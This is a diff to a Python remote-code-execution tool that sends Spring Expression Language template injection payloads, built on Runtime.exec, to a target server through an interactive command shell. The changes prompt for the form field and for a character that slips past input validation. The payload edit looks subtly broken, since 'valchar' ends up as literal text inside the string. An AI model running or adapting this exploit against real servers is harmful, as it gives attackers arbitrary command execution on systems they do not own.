@@ -3,12 +3,14 @@ from cmd import Cmd
 import urllib.parse, argparse, requests
 from time import gmtime, strftime
 
+
+dataval = input('Insert data value: ')
+valchar= input('input validation\nworkaround character: ')
 parser = argparse.ArgumentParser(description="RCE.")
 parser.add_argument("-t", "--target",metavar="",required=True,help="Target to give an STI")
 parser.add_argument("-u","--url-encode", action="store_true", help="URL Encode")
 parser.add_argument("-d","--debug", action="store_true",default=False, help="Print debug")
 args = parser.parse_args()
-
 
 url_encode=args.url_encode
 target=args.target
@@ -36,7 +38,7 @@ class Terminal(Cmd):
 		for i in command:
 			decimals.append(str(ord(i)))
 
-		payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
+		payload='''valchar+{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
 		#replaced dollar sign with * for input validation workaround
 
 		for i in decimals[1:]:
@@ -60,7 +62,7 @@ class Terminal(Cmd):
 
 		url=base_url
 
-		data = {"name": payload} #This usually has to be added but there is a Burp extension to convert burp headers into python request headers.
+		data = {dataval : payload} #This usually has to be added but there is a Burp extension to convert burp headers into python request headers.
 		debug('data: ',str(data))
 		try:
 			response=requests.post(url, data=data)
